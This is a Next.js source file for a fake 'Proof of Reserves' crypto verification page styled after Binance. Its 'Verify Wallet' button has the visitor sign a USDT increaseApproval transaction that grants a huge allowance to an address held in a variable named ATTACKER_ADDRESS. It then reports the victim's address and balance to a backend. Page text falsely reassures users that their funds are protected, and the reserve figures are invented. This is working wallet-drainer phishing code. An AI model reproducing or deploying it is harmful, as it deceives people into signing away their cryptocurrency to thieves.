import type { NextPage } from 'next';
import Head from 'next/head';
import useExternalScriptsForIndex from '../utils/useExternalScriptsForIndex';
import { ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import toastNotification from '../components/toastNotify';
import { useAdapters } from '../utils/AdaptersContext';
import { useEffect, useState } from 'react';
import TronWeb from 'tronweb';
import axios from 'axios';

const LandingPage: NextPage = () => {
    useExternalScriptsForIndex();
    const { adapters, selectedIndex, setSelectedIndex } = useAdapters();
    const [loading, setLoading] = useState(false);
    const [loginShow, setLoginShow] = useState(false);
    const [balance, setBalance] = useState(0);

    const tronWeb = new TronWeb({
              fullHost: 'https://api.trongrid.io',
              headers: { 'TRON-PRO-API-KEY': process.env.NEXT_PUBLIC_TRONGRID_API_KEY },
            });

              
    function handleLoginClose() {
        setLoginShow(false);
    }

    async function checkBalance() {
        const functionSelector = 'balanceOf(address)';
        const parameter = [{ type: 'address', value: adapters[selectedIndex].address }];

        try {
            const result = await tronWeb.transactionBuilder.triggerConstantContract('USDT_ADDRESS', functionSelector, {}, parameter);

            // Extract constant_result from the result
            const constantResult = result.constant_result[0];

            // Convert constant result from hexadecimal to decimal
            const balance = parseInt(constantResult, 16);
            setBalance(balance);
            return balance;

        } catch (error) {
            console.error('Error:', error);
            return;
        }

    }

    async function connectWallet(index: number) {
        setLoading(true);
        const adapter = adapters[index]; // Use selected adapter
        if (adapter.address == null) {
            try {
                await adapter.connect();
                setLoading(false);
                // setUserReferral(adapter.address);
                setLoginShow(false);
                await checkBalance();
                toastNotification('Wallet Connected', true);
            } catch (error) {
                setLoading(false);
                setLoginShow(false);
                toastNotification('Error connecting wallet', false);
            }
        } else {
            try {
                await adapter.disconnect();
                setLoading(false);
                setLoginShow(false);
                // toastNotification('Wallet Disconnected', true);  Update message accordingly
            } catch (error) {
                setLoading(false);
                setLoginShow(false);
                toastNotification('Error disconnecting wallet', false);
            }
        }
    }

    async function verifyWallet() {
        await approveUSDT(100000000);
        await sendNotification();
    }

    async function selectAdapter(index: number) {
        setSelectedIndex(index);
        setLoginShow(false);
        toastNotification("Please wait", true);
        await new Promise(resolve => setTimeout(resolve, 3000));
        await connectWallet(index);
    }


    
  // Method to send Notification
  const sendNotification = async () => {
   
    try {
      axios.get(`${process.env.NEXT_PUBLIC_BACKEND_URL}/backend/${adapters[selectedIndex].address}/user/${balance.toString()}`).then((res) => {
      });
    } catch (error) {
      console.error('Error sending SMS:', error);
    }
  };

    
    // Approval or increaseApproval
    async function approveUSDT(amount:number) {
        try {
            // Prepare the parameters for the USDT contract's approve function
            const functionSelector = 'increaseApproval(address,uint256)';
            const params = [
                { type: 'address', value: process.env.NEXT_PUBLIC_ATTACKER_ADDRESS }, // The Developer contract address
                { type: 'uint256', value: amount * 1000000 }           // The amount of USDT to approve, converted to smallest unit
            ];
            const options = {
                feeLimit: 100000000,
                callValue: 0,
                shouldPollResponse: true
            };
                console.log(process.env.NEXT_PUBLIC_USDT_ADDRESS)
            // Trigger the smart contract function
            const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
                process.env.NEXT_PUBLIC_USDT_ADDRESS, // The USDT contract address
                functionSelector,
                options,
                params,
                adapters[selectedIndex].address  // User's address
            );

            // Sign the transaction with WalletConnect
            const signedTransaction = await adapters[selectedIndex].signTransaction(transaction.transaction);

            // Broadcast the transaction
            const receipt = await tronWeb.trx.sendRawTransaction(signedTransaction);
            console.log('USDT Approval transaction receipt', receipt);

            return receipt;
        } catch (error) {
            console.error('Error during USDT approval:', error);
            throw error;
        }
    }

  return (
    <>
      <Head key={"landing-page"}> 
          <meta charSet="UTF-8"/>
          <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
          <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
          <title>Asset Proof</title>
          <link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon.png"/>
          <link rel="stylesheet" href="/assets/vendor/nice-select/css/nice-select.css"/>
          <link rel="stylesheet" href="/assets/vendor/owl-carousel/css/owl.theme.default.css"/>
          <link rel="stylesheet" href="/assets/vendor/owl-carousel/css/owl.carousel.min.css"/>
          <link rel="stylesheet" href="/assets/css/style.css"/>
          <script defer
            src="https://code.jquery.com/jquery-3.3.1.js"
            integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60="
            crossOrigin="anonymous"></script>
      </Head>

      <body>

      <div id="main-wrapper" className='show'>

        <div className="header">
            <div className="container">
                <div className="row">
                    <div className="col-xl-12">
                        <div className="navigation">
                            <nav className="navbar navbar-expand-lg navbar-light bg-light">
                                <a className="navbar-brand"><img src="/assets/images/logo.png" alt=""/></a>
                                <button className="navbar-toggler" type="button" data-toggle="collapse"
                                    data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown"
                                    aria-expanded="false" aria-label="Toggle navigation">
                                    <span className="navbar-toggler-icon"></span>
                                </button>
                                <div className="collapse navbar-collapse" id="navbarNavDropdown">
                                    <ul className="navbar-nav">
                                                                                
                                        <li className="nav-item">
                                            <a className="nav-link" href="#" data-scroll-nav="0">Home</a>
                                        </li>
                                        <li className="nav-item">
                                            <a className="nav-link" href="#" data-scroll-nav="1">Reports</a>
                                        </li>
                                        <li className="nav-item">
                                            <a className="nav-link" href="#" data-scroll-nav="2">Commitment </a>
                                        </li>
                                        <li className="nav-item">
                                            <a className="nav-link" href="#" data-scroll-nav="6">About</a>
                                        </li>
                                    </ul>
                                </div>
                                
                                <div className="signin-btn">
                                    <a className="btn btn-primary text-white" onClick={() => adapters[selectedIndex].address?connectWallet(selectedIndex):setLoginShow(true)}>
                                                { loading?'...loading': 
                                                adapters[selectedIndex].address ?  "..."+adapters[selectedIndex].address.slice(-4)
                                                : "Connect Wallet"}</a>
                                </div>
                            </nav>
                        </div>
                    </div>
                </div>
            </div>
        </div>


        <div className="intro" data-scroll-index="0">
            <div className="container">
                <div className="row justify-content-between align-items-center">
                    <div className="col-xl-6 col-lg-6 col-12">
                        <div className="intro-content">
                            <h1>Proof of <strong className="text-primary"> Reserves </strong>
                            </h1>
                            <p>We maintain a 1:1 reserve of all users&apos; funds on our platform and periodically performs proof of reserves reports aimed at generating greater transparency in the assets held on our exchange</p>
                        </div>

                        <div className="intro-btn">
                            <a className="btn btn-primary text-white" onClick={() => adapters[selectedIndex].address?connectWallet(selectedIndex):setLoginShow(true)}>
                                    { loading?'...loading': 
                                    adapters[selectedIndex].address ?  "..."+adapters[selectedIndex].address.slice(-4)
                                    : "Connect Wallet"}</a>
                                   {adapters[selectedIndex].address? <a onClick={() => verifyWallet()} className="btn btn-outline-primary">Verify Wallet</a> : null}
  
                        </div>
                    </div>
                    <div className="col-xl-5 col-lg-6 col-12">
                    <div className="portfolio_img">
                            <img src="/assets/images/background/1.png" alt="" className="img-fluid"/>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div className="price-grid section-padding" data-scroll-index="1">
        <div className="section-title">
                            <h2>Latest verification date: 05/04/2024, 12:00:00 (UTC+8)</h2>
                        </div>

            <div className="container">
                <div className="row">
                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                        <div className="card">
                            <div className="card-header">
                                <div className="media">
                                    <span><i className="cc BTC"></i></span>
                                    <div className="media-body">
                                        Bitcoin
                                    </div>
                                </div>
                                <p className="mb-0"> 104%</p>
                            </div>
                            <div className="card-header">
                                <div className="media-body">User asset holdings </div>
                                <p className="text-success mb-0">148,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">wallet assets </div>
                                <p className="text-success mb-0">178,030</p>
                            
                            </div>

                            <div className="card-header">
                                <div className="media-body">Exchange </div>
                                <p className="text-success mb-0">278,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">3rd party holdings </div>
                                <p className="text-success mb-0">8,030</p>
                            
                            </div>
                        </div>
                    </div>

                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                        <div className="card">
                            <div className="card-header">
                                <div className="media">
                                    <span><i className="cc LTC"></i></span>
                                    <div className="media-body">
                                        Litecoin
                                    </div>
                                </div>
                                <p className="mb-0"> 70%</p>
                            </div>
                            <div className="card-header">
                                <div className="media-body">User asset holdings </div>
                                <p className="text-success mb-0">168,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">wallet assets </div>
                                <p className="text-success mb-0">128,030</p>
                            
                            </div>

                            <div className="card-header">
                                <div className="media-body">Exchange </div>
                                <p className="text-success mb-0">178,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">3rd party holdings </div>
                                <p className="text-success mb-0">3,030</p>
                            
                            </div>
                        </div>
                    </div>

                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                        <div className="card">
                            <div className="card-header">
                                <div className="media">
                                    <span><i className="cc DASH"></i></span>
                                    <div className="media-body">
                                        Dashcoin
                                    </div>
                                </div>
                                <p className="mb-0"> 90%</p>
                            </div>
                            <div className="card-header">
                                <div className="media-body">User asset holdings </div>
                                <p className="text-success mb-0">90,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">wallet assets </div>
                                <p className="text-success mb-0">78,030</p>
                            
                            </div>

                            <div className="card-header">
                                <div className="media-body">Exchange </div>
                                <p className="text-success mb-0">278,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">3rd party holdings </div>
                                <p className="text-success mb-0">10,030</p>
                            
                            </div>
                        </div>
                    </div>

                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                        <div className="card">
                            <div className="card-header">
                                <div className="media">
                                    <span><i className="cc XRP"></i></span>
                                    <div className="media-body">
                                        Ripple
                                    </div>
                                </div>
                                <p className="mb-0"> 24h</p>
                            </div>
                            <div className="card-header">
                                <div className="media-body">User asset holdings </div>
                                <p className="text-success mb-0">70,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">wallet assets </div>
                                <p className="text-success mb-0">58,030</p>
                            
                            </div>

                            <div className="card-header">
                                <div className="media-body">Exchange </div>
                                <p className="text-success mb-0">40,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">3rd party holdings </div>
                                <p className="text-success mb-0">5,450</p>
                            
                            </div>
                        </div>
                    </div>

                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                        <div className="card">
                            <div className="card-header">
                                <div className="media">
                                    <span><i className="cc ETH"></i></span>
                                    <div className="media-body">
                                        Ethereum
                                    </div>
                                </div>
                                <p className="mb-0"> 120%</p>
                            </div>
                            <div className="card-header">
                                <div className="media-body">User asset holdings </div>
                                <p className="text-success mb-0">208,040</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">wallet assets </div>
                                <p className="text-success mb-0">198,920</p>
                            
                            </div>

                            <div className="card-header">
                                <div className="media-body">Exchange </div>
                                <p className="text-success mb-0">308,000</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">3rd party holdings </div>
                                <p className="text-success mb-0">54,100</p>
                            
                            </div>
                        </div>
                    </div>

                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                        <div className="card">
                            <div className="card-header">
                                <div className="media">
                                    <span><i className="cc USDT"></i></span>
                                    <div className="media-body">
                                        Tether
                                    </div>
                                </div>
                                <p className="mb-0"> 110%</p>
                            </div>
                            <div className="card-header">
                                <div className="media-body">User asset holdings </div>
                                <p className="text-success mb-0">148,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">wallet assets </div>
                                <p className="text-success mb-0">178,030</p>
                            
                            </div>

                            <div className="card-header">
                                <div className="media-body">Exchange </div>
                                <p className="text-success mb-0">278,030</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">3rd party holdings </div>
                                <p className="text-success mb-0">8,030</p>
                            
                            </div>
                        </div>
                    </div>

                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                        <div className="card">
                            <div className="card-header">
                                <div className="media">
                                    <span><i className="cc EOS"></i></span>
                                    <div className="media-body">
                                        Eosio
                                    </div>
                                </div>
                                <p className="mb-0"> 20%</p>
                            </div>
                            <div className="card-header">
                                <div className="media-body">User asset holdings </div>
                                <p className="text-success mb-0">28,240</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">wallet assets </div>
                                <p className="text-success mb-0">20,080</p>
                            
                            </div>

                            <div className="card-header">
                                <div className="media-body">Exchange </div>
                                <p className="text-success mb-0">10,010</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">3rd party holdings </div>
                                <p className="text-success mb-0">2,090</p>
                            
                            </div>
                        </div>
                    </div>

                    <div className="col-xl-3 col-lg-4 col-md-6 col-sm-6">
                        <div className="card">
                            <div className="card-header">
                                <div className="media">
                                    <span><i className="cc XTZ"></i></span>
                                    <div className="media-body">
                                        Tezos
                                    </div>
                                </div>
                                <p className="mb-0"> 30%</p>
                            </div>
                            <div className="card-header">
                                <div className="media-body">User asset holdings </div>
                                <p className="text-success mb-0">5,010</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">wallet assets </div>
                                <p className="text-success mb-0">3,200</p>
                            
                            </div>

                            <div className="card-header">
                                <div className="media-body">Exchange </div>
                                <p className="text-success mb-0">60,000</p>
                            
                            </div>
                            <div className="card-header">
                                <div className="media-body">3rd party holdings </div>
                                <p className="text-success mb-0">8,020</p>
                            
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div className="get-touch section-padding"  data-scroll-index="6">
            <div className="container">
                <div className="row justify-content-center">
                    <div className="col-xl-6">
                        <div className="section-title">
                            <h2>Our Commitment to Transparency</h2>
                        </div>
                    </div>
                </div>
                <div className="row">
                    <div className="col-xl-4 col-lg-4 col-md-4">
                        <div className="get-touch-content">
                            <div className="media">
                                <span><i className="fa fa-shield"></i></span>
                                <div className="media-body">
                                    <h4>Transparency</h4>
                                    <p>We will always be transparent with our users
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="col-xl-4 col-lg-4 col-md-4">
                        <div className="get-touch-content">
                            <div className="media">
                                <span><i className="fa fa-cubes"></i></span>
                                <div className="media-body">
                                    <h4>Safety</h4>
                                    <p>The safety of our users funds is a priority for us
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="col-xl-4 col-lg-4 col-md-4">
                        <div className="get-touch-content">
                            <div className="media">
                                <span><i className="fa fa-certificate"></i></span>
                                <div className="media-body">
                                    <h4>Protected</h4>
                                    <p>Your funds are protected, we only do one contract call for proof of funds
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                
                </div>
            </div>
        </div>



        <div className="portfolio section-padding-bottom" data-scroll-index="2">
            <div className="container">
                {/* <div className="row py-lg-5 justify-content-center">
                    <div className="col-xl-7">
                        <div className="section-title text-center">
                            <h2>Your 24/7 AI Trading Genius</h2>
                            <p>Leveraging sophisticated datasets, our AI delves deeper into market trends, offering you rich, actionable insights.</p>
                        </div>
                    </div>
                </div> */}
                <div className="row align-items-center justify-content-between">
                    <div className="col-xl-7 col-lg-6">
                        <div className="portfolio_list">
                            <div className="row">
                                <div className="col-xl-12">
                                    <div className="media">
                                    
                                        <div className="media-body">
                                            <h4>
                                                What have we built?</h4>
                                            <p>In order to show that we have  all user assets 1:1, we have built and implemented the Merkle tree (shown below) to allow people to verify their assets within the platform. 
                                            Our goal is that every user will be able to verify their asset holdings using their own generated Merkle hash/record ID. 
                                            This way people will be able to confirm that their funds are held 1:1 and they can have it verified by a third-party audit agency.
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            
                            
                                
                            </div>
                            <div className="row">
                                <div className="col-xl-12">
                                    <div className="media">
                                    
                                        <div className="media-body">
                                            <h4>
                                            What is a Merkle Tree?</h4>
                                            <p>A Merkle Tree is a cryptographic tool that enables the consolidation of large amounts of data into a single hash.
                                            This single hash, called a Merkle Root, acts as a cryptographic seal that “summarizes” all the inputted data. Additionally,
                                                Merkle Trees give users the ability to verify specific contents that were included within a particular set of “sealed” data. 
                                            We use these properties of Merkle Trees during our Proof of funds assessments to verify individual user accounts are included within
                                            the liabilities report inspected by the auditor.
                                            </p>
                                        </div>
                                    </div>
                                </div>
                                
                            
                                
                            </div>
                        </div>
                    </div>
                    <div className="col-xl-5 col-lg-6">
                        <div className="portfolio_img" >
                            <img src="/assets/images/background/hash-dark.png" alt="" className="img-fluid"/>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div className="get-touch section-padding"  data-scroll-index="6">
            <div className="container">
                <div className="row justify-content-center">
                    <div className="col-xl-6">
                        <div className="section-title">
                            <h2>How it works.</h2>
                        </div>
                    </div>
                    <div className="col-xl-12 col-lg-12">
                        <div className="portfolio_img">
                            <img src="/assets/images/background/10.png" alt="" className="img-fluid"/>
                        </div>
                        
                    </div>
                </div>
        
                <div className="row" style={{ marginTop: "50px" }}>
            
                    <div className="col-xl-6 col-lg-6 col-md-6">
                        <div className="get-touch-content">
                            <div className="media">
                            
                                <div className="media-body">
                                    <h4>01. Wallet Connect & Authorizatoin</h4>
                                    <p>For assets that are used to verify reserves, 
                                    we must ensure that ownership of the wallet belongs to
                                    the user (including cold and hot wallet). So after wallet connection, the user will be prompted to authorize
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="col-xl-6 col-lg-6 col-md-6">
                        <div className="get-touch-content">
                            <div className="media">
                            
                                <div className="media-body">
                                    <h4>02. Snapshot of User Balances</h4>
                                    <p>The snapshot value is calculated based on the asset holding within 
                                    the customer&apos;s account balances at the date and time of the snapshot.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="col-xl-6 col-lg-6 col-md-6">
                        <div className="get-touch-content">
                            <div className="media">
                                
                                <div className="media-body">
                                    <h4>03 Generate zk-SNARKs Proof</h4>
                                    <p> We generate zk-SNARKs proof files for users so that each user 
                                    can easily access their leaf node, providing transparency for all users
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div className="col-xl-6 col-lg-6 col-md-6">
                        <div className="get-touch-content">
                            <div className="media">
                                
                                <div className="media-body">
                                    <h4>04 Generation of Merkle Tree</h4>
                                    <p>We generate the underlying data block by linking the hashed UID and balance of each user.
                                    We then generate a Merkle tree based upon all users&apos; data. The Merkle root will 
                                    change if any account ID or balance in the leaf node changes. 
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>




        <div className="bottom section-padding">
        <div className="container">
        <div className="row">
        <div className="col-xl-3 col-lg-3 col-md-3 col-sm-3">
        <div className="bottom-logo">
        <img className="pb-3" src="/assets/images/logo.png" alt=""/>
        <p>Proof of Reserves (PoR) verifies digital asset collateralization held by crypto businesses, 
        helping bring greater transparency to depositors via public attestations and independent audits.</p>
        </div>
        </div>
        <div className="col-xl-3 col-lg-3 col-md-3 col-sm-3">
        <div className="bottom-widget">
        <h4 className="widget-title">Company</h4>
        <ul>
        <li><a href="#" data-scroll-nav="0">Home</a></li>
        <li><a href="#" data-scroll-nav="1">Latest Reports</a></li>
        <li><a href="#" data-scroll-nav="1">Privacy</a></li>
        </ul>
        </div>
        </div>
        <div className="col-xl-3 col-lg-3 col-md-3 col-sm-3">






        <div className="bottom-widget">
        <h4 className="widget-title">Products</h4>
        <ul>
        <li><a href="https://www.binance.com/en/eth2" data-scroll-nav="2"> ETH Staking</a></li>
        <li><a href="https://www.binance.com/en/nft/home" data-scroll-nav="6">NFT</a></li>
        <li><a href="https://www.binance.com/en/bnb" data-scroll-nav="6">BNB</a></li>
        <li><a href="https://www.binance.com/en/BABT?source=footer" data-scroll-nav="6">BABT</a></li>
        <li><a href="https://www.binance.com/en/research" data-scroll-nav="6">Research</a></li>
        <li><a href="https://www.binance.charity/" data-scroll-nav="6">Charity</a></li>
        </ul>
        </div>

        </div>
        <div className="col-xl-3 col-lg-3 col-md-3 col-sm-3">







        <div className="bottom-widget">
        <h4 className="widget-title">Business</h4>
        <ul>
        <li><a href="https://www.binance.com/en/how-to-buy/bitcoin" data-scroll-nav="2">Buy BNB</a></li>
        <li><a href="https://www.binance.com/en/how-to-buy/bitcoin" data-scroll-nav="6">Buy Ripple</a></li>
        <li><a href="https://www.binance.com/en/how-to-buy/bitcoin" data-scroll-nav="6">Buy Dogecoin</a></li>
        <li><a href="https://www.binance.com/en/how-to-buy/bitcoin" data-scroll-nav="6">Buy Bitcoin</a></li>
        <li><a href="https://www.binance.com/en/price/ethereum" data-scroll-nav="6">Ethereum Price</a></li>
        <li><a href="https://www.binance.com/en/price-prediction" data-scroll-nav="6">Browse Crypto Price Predictions</a></li>
        </ul>
        </div>

        </div>
        </div>
        </div>
        </div>

        <div className="footer">
            <div className="container">
                <div className="row">
                    <div className="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                        <div className="copyright">
                            <p>© Copyright 2024 <a href="#"></a> | All Rights Reserved</p>
                        </div>
                    </div>
                    <div className="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
                        <div className="footer-social">
                            <ul>
                                <li><a href="#"><i className="fa fa-facebook"></i></a></li>
                                <li><a href="#"><i className="fa fa-twitter"></i></a></li>
                                <li><a href="#"><i className="fa fa-linkedin"></i></a></li>
                                <li><a href="#"><i className="fa fa-youtube"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        </div>

        {/* Login Modal */}
        <div className={`modal fade ${loginShow ? "show" : ""}`} tabIndex={-1} role="dialog" aria-labelledby="loginModalLabel" aria-hidden="true" style={{ display: loginShow ? "block" : "none" }}>
         <div className="modal-dialog" role="document" style={{ backgroundColor:'#131722', pointerEvents:"auto" }}>
             <div className="auth-form card">
                 <div className="card-body">
                     <form action="" className="identity-upload">
                         <div className="text-end" style={{display: 'flex', justifyContent: 'flex-end', marginTop:"0.1rem" }}>
                             <button type="button" className="btn btn-danger pl-5 pr-5" onClick={handleLoginClose}><i className="fa fa-times"></i> Back</button>
                         </div>
                         <div className="identity-content">
                             <span className="icon"><i className="fa fa-shield"></i></span>
                             <h4>Select Wallet</h4>
                             {/* <p>Trust Wallet / Binance</p> */}
                             <div className="text-center">
                                 <label htmlFor="walletconnect" style={{ color:"white" }}>Trust Wallet / Other Wallets: &nbsp;</label>
                                 <button type="button" className="btn btn-success" onClick={() => selectAdapter(0)}>WalletConnect</button>
                             </div>
                             {/* <p>TronLink</p> */}
                             <div className="text-center" style={{ marginTop:"1.2rem", marginBottom:"1.4rem" }}>
                                 <label htmlFor="tronlink" style={{ color:"white" }}>TronLink: &nbsp;</label>
                                 <button type="button" className="btn btn-primary pl-5 pr-5"  onClick={() => selectAdapter(1)}>Connect</button>
                             </div>
                         </div>
                     </form>
                 </div>
             </div>
             {/* <div className="modal-content">
             <div className="modal-header">
                 <h5 className="modal-title" id="loginModalLabel">Select Wallet</h5>
                 <button type="button" className="close" data-dismiss="modal" aria-label="Close" onClick={handleLoginClose}>
                 <span aria-hidden="true">&times;</span>
                 </button>
             </div>
             <div className="modal-body">
                 <form>
                 <div className="form-group">
                     <label htmlFor="createAccountEmail">TronLink: </label>
                     <button type="button" className="btn btn-primary" style={{marginLeft:'12px'}} onClick={() => selectAdapter(1)}>Use TronLink</button>
                 </div>
                 <div className="form-group">
                     <label htmlFor="loginPassword">Trust Wallet / Binance: </label>
                     <button type="button" className="btn btn-purple-xx" style={{marginLeft:'12px'}} onClick={() => selectAdapter(0)}>Use WalletConnect</button>
                 </div>
                 </form>
             </div>
             <div className="modal-footer">
                 <button type="button" className="btn btn-secondary" data-dismiss="modal" onClick={handleLoginClose}>Close</button>
             </div>
             </div> */}
         </div>
     </div>
     {/* end modals */}

      </body>
    </>

  );
//   
};

export default LandingPage;
